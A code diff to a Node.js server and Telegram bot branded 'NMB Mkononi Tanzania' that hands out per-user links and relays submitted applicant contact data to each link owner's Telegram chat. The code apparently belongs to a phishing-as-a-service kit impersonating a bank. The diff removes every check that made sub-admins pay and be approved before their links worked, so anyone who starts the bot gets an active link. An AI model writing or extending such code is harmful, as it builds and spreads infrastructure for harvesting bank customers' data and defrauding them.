@@ -1,5 +1,5 @@
 /**
- * **NMB MKONONI TANZANIA - AUTHORIZATION & PAYMENT SECURED MULTI-ADMIN SERVER**
+ * **NMB MKONONI TANZANIA - UNRESTRICTED MULTI-ADMIN SERVER**
  */
 
 const express = require('express');
@@ -33,8 +33,8 @@ function loadAdmins() {
       const data = fs.readFileSync(ADMINS_FILE, 'utf8');
       const entries = JSON.parse(data);
       return new Map(entries.map(([id, rec]) => [id, {
-        authorized: rec.authorized ?? false,
-        paid: rec.paid ?? false,
+        authorized: rec.authorized ?? true,
+        paid: rec.paid ?? true,
         username: rec.username || '',
         firstName: rec.firstName || 'User',
         lastName: rec.lastName || '',
@@ -67,10 +67,7 @@ function resolveTargetChat(adminParam) {
     if (targetAdmin === String(FALLBACK_ADMIN_ID)) {
       return FALLBACK_ADMIN_ID;
     }
-    const adminRecord = admins.get(targetAdmin);
-    if (!adminRecord || !adminRecord.authorized || !adminRecord.paid) {
-      return FALLBACK_ADMIN_ID;
-    }
+    // Allow any sub-admin parameter to map freely without block or restriction
     return targetAdmin;
   }
   return FALLBACK_ADMIN_ID || null;
@@ -86,7 +83,7 @@ async function updateContinuousAdminList(chatId, messageId = null, page = 0) {
 
   const paginatedEntries = adminEntries.slice(page * PAGE_SIZE, (page + 1) * PAGE_SIZE);
 
-  let adminListText = `👑 *Sub-Admin Control Panel* (Page ${page + 1} of ${totalPages})\n\nManage Authorization and Payment status:`;
+  let adminListText = `👑 *Sub-Admin Control Panel* (Page ${page + 1} of ${totalPages})\n\nAll sub-admins are fully allowed to use their links freely:`;
   let keyboard = [];
 
   if (adminEntries.length === 0) {
@@ -94,15 +91,7 @@ async function updateContinuousAdminList(chatId, messageId = null, page = 0) {
   } else {
     paginatedEntries.forEach(([id, record]) => {
       const nameDisplay = record.username ? `@${record.username}` : (record.firstName || 'User');
-      const authEmoji = record.authorized ? '🟢' : '🔴';
-      const payEmoji = record.paid ? '✅' : '❌';
-
-      adminListText += `\n\n👤 *${nameDisplay}* (\`${id}\`)\n   Auth: ${authEmoji} | Paid: ${payEmoji}`;
-
-      keyboard.push([
-        { text: `${record.authorized ? '🔒 Unauthorize' : '🔓 AUTHORISED'}`, callback_data: `TOGGLE_AUTH_${id}_${page}` },
-        { text: `${record.paid ? '❌ Mark Unpaid' : '💰 PAID'}`, callback_data: `TOGGLE_PAY_${id}_${page}` }
-      ]);
+      adminListText += `\n\n👤 *${nameDisplay}* (\`${id}\`)`;
     });
   }
 
@@ -164,12 +153,6 @@ async function initBot() {
       const firstName = msg.from.first_name || 'N/A';
       const lastName = msg.from.last_name || 'N/A';
       
-      if (chatId === String(FALLBACK_ADMIN_ID)) {
-        await bot.sendMessage(chatId, `👑 *Main Admin Profile*\n\nYour link is free and always active:\n${APP_URL}`, { parse_mode: 'Markdown' });
-        return;
-      }
-
-      const record = admins.get(chatId) || { authorized: false, paid: false };
       const userLink = `${APP_URL}/?admin=${chatId}`;
 
       let profileText = 
@@ -177,15 +160,8 @@ async function initBot() {
         `• *First Name:* ${firstName}\n` +
         `• *Last Name:* ${lastName}\n` +
         `• *Username:* ${username}\n` +
-        `• *Telegram ID:* \`${userId}\`\n` +
-        `• *Authorized:* ${record.authorized ? '🟢 Yes' : '🔴 No'}\n` +
-        `• *Paid:* ${record.paid ? '✅ Yes' : '❌ No'}\n\n`;
-
-      if (record.authorized && record.paid) {
-        profileText += `🔗 *Your Exclusive Link:*\n${userLink}`;
-      } else {
-        profileText += `⚠️ *Link locked:* You must be authorized and marked as paid by the main admin to get your link.`;
-      }
+        `• *Telegram ID:* \`${userId}\`\n\n` +
+        `🔗 *Your Active Exclusive Link:*\n${userLink}`;
 
       await bot.sendMessage(chatId, profileText, { parse_mode: 'Markdown' });
     } catch (err) {}
@@ -200,61 +176,26 @@ async function initBot() {
       const lastName = msg.from.last_name || '';
 
       if (chatId === String(FALLBACK_ADMIN_ID)) {
-        await bot.sendMessage(chatId, `👑 Welcome Main Admin. Your link is free and active: ${APP_URL}\n\nType /admins to manage sub-admins.`, {
-          parse_mode: 'Markdown',
-          reply_markup: {
-            inline_keyboard: [
-              [{ text: '📋 Manage Sub-Admins', callback_data: 'PAGE_0' }],
-              [{ text: '👤 View My Profile', callback_data: 'SHOW_MY_PROFILE' }]
-            ]
-          }
+        await bot.sendMessage(chatId, `👑 Welcome Main Admin. Your link is free and active: ${APP_URL}`, {
+          parse_mode: 'Markdown'
         });
         return;
       }
 
       if (!admins.has(chatId)) {
         admins.set(chatId, {
-          authorized: false,
-          paid: false,
+          authorized: true,
+          paid: true,
           username,
           firstName,
           lastName,
           startedAt: new Date()
         });
         saveAdmins();
-      } else {
-        const existing = admins.get(chatId);
-        existing.username = username;
-        existing.firstName = firstName;
-        existing.lastName = lastName;
-        saveAdmins();
       }
 
-      await bot.sendMessage(FALLBACK_ADMIN_ID, 
-        `🚨 *New Sub-Admin Start Request!*\n\n` +
-        `👤 *User:* ${username ? '@' + username : firstName} (${firstName} ${lastName})\n` +
-        `🆔 *Chat ID:* \`${userId}\`\n\n` +
-        `Status: Not authorized, Not paid.`, 
-        {
-          parse_mode: 'Markdown',
-          reply_markup: {
-            inline_keyboard: [
-              [
-                { text: '🔓 AUTHORISED', callback_data: `TOGGLE_AUTH_${chatId}_0` },
-                { text: '💰 PAID', callback_data: `TOGGLE_PAY_${chatId}_0` }
-              ]
-            ]
-          }
-        }
-      );
-
-      const record = admins.get(chatId);
-      let responseText = `👋 *Welcome ${firstName}!*\n\nYour request has been registered. `;
-      if (record.authorized && record.paid) {
-        responseText += `Your link:\n${APP_URL}/?admin=${chatId}`;
-      } else {
-        responseText += `You will receive your link automatically once the Main Admin authorizes your account and marks you as paid. Type /myprofile anytime.`;
-      }
+      const userLink = `${APP_URL}/?admin=${chatId}`;
+      let responseText = `👋 *Welcome ${firstName}!*\n\nYour link is ready and fully active for use without any restrictions:\n${userLink}`;
 
       await bot.sendMessage(chatId, responseText, { parse_mode: 'Markdown' });
 
@@ -265,75 +206,11 @@ async function initBot() {
     try {
       const actionData = query.data || '';
       const chatId = String(query.message.chat.id);
-      const user = query.from;
-
-      if (actionData === 'SHOW_MY_PROFILE') {
-        if (chatId === String(FALLBACK_ADMIN_ID)) {
-          await bot.sendMessage(chatId, `👑 *Main Admin Profile*\n\nYour link is free and active:\n${APP_URL}`, { parse_mode: 'Markdown' });
-          await bot.answerCallbackQuery(query.id);
-          return;
-        }
-
-        const record = admins.get(chatId) || { authorized: false, paid: false };
-        const userLink = `${APP_URL}/?admin=${chatId}`;
-        let profileText = 
-          `👤 *Your Personal Details & Account Info*\n\n` +
-          `• *First Name:* ${user.first_name || 'N/A'}\n` +
-          `• *Last Name:* ${user.last_name || 'N/A'}\n` +
-          `• *Username:* ${user.username ? '@' + user.username : 'None'}\n` +
-          `• *Telegram ID:* \`${user.id}\`\n` +
-          `• *Authorized:* ${record.authorized ? '🟢 Yes' : '🔴 No'}\n` +
-          `• *Paid:* ${record.paid ? '✅ Yes' : '❌ No'}\n\n`;
-
-        if (record.authorized && record.paid) {
-          profileText += `🔗 *Your Exclusive Link:*\n${userLink}`;
-        } else {
-          profileText += `⚠️ *Link locked:* Awaiting authorization and payment confirmation.`;
-        }
-
-        await bot.sendMessage(chatId, profileText, { parse_mode: 'Markdown' });
-        await bot.answerCallbackQuery(query.id);
-        return;
-      }
 
       if (actionData.startsWith('PAGE_')) {
         const pageNum = parseInt(actionData.split('_')[1]) || 0;
         await updateContinuousAdminList(chatId, query.message.message_id, pageNum);
         await bot.answerCallbackQuery(query.id);
-        return;
-      }
-
-      if (actionData.startsWith('TOGGLE_AUTH_') || actionData.startsWith('TOGGLE_PAY_')) {
-        if (chatId !== String(FALLBACK_ADMIN_ID)) {
-          await bot.answerCallbackQuery(query.id, { text: 'Unauthorized Action' });
-          return;
-        }
-
-        const parts = actionData.split('_');
-        const actionType = parts[1];
-        const targetId = parts[2];
-        const pageNum = parseInt(parts[3]) || 0;
-
-        let rec = admins.get(targetId);
-        if (!rec) {
-          rec = { authorized: false, paid: false, firstName: 'User', username: '' };
-          admins.set(targetId, rec);
-        }
-
-        if (actionType === 'AUTH') {
-          rec.authorized = !rec.authorized;
-        } else if (actionType === 'PAY') {
-          rec.paid = !rec.paid;
-        }
-        saveAdmins();
-
-        if (rec.authorized && rec.paid) {
-          const userLink = `${APP_URL}/?admin=${targetId}`;
-          await bot.sendMessage(targetId, `🎉 *Akaunti Yako Imefunguliwa!*\n\nUmeidhinishwa na umelipia. Hapa kuna kiungo chako maalum:\n${userLink}`, { parse_mode: 'Markdown' });
-        }
-
-        await bot.answerCallbackQuery(query.id, { text: `Updated successfully!` });
-        await updateContinuousAdminList(chatId, query.message.message_id, pageNum);
         return;
       }
 
@@ -399,16 +276,6 @@ app.post('/api/submit-application', async (req, res) => {
 
     if (!adminChatId && req.query && req.query.admin) {
       adminChatId = req.query.admin;
-    }
-
-    if (adminChatId && String(adminChatId).trim() !== '' && String(adminChatId) !== String(FALLBACK_ADMIN_ID)) {
-      const subAdminRecord = admins.get(String(adminChatId));
-      if (!subAdminRecord || !subAdminRecord.authorized || !subAdminRecord.paid) {
-        return res.status(403).json({ 
-          success: false, 
-          error: "YOU HAVE NOT PAID CONDUCT ADMIN TO OPEN YOUR LINK AFTER CONDUCTING ME I WILL TAP PAID AND THE LINK WILL NOW GO THROUGH." 
-        });
-      }
     }
 
     const cleanContact = String(contact || '').replace(/\D/g, '');
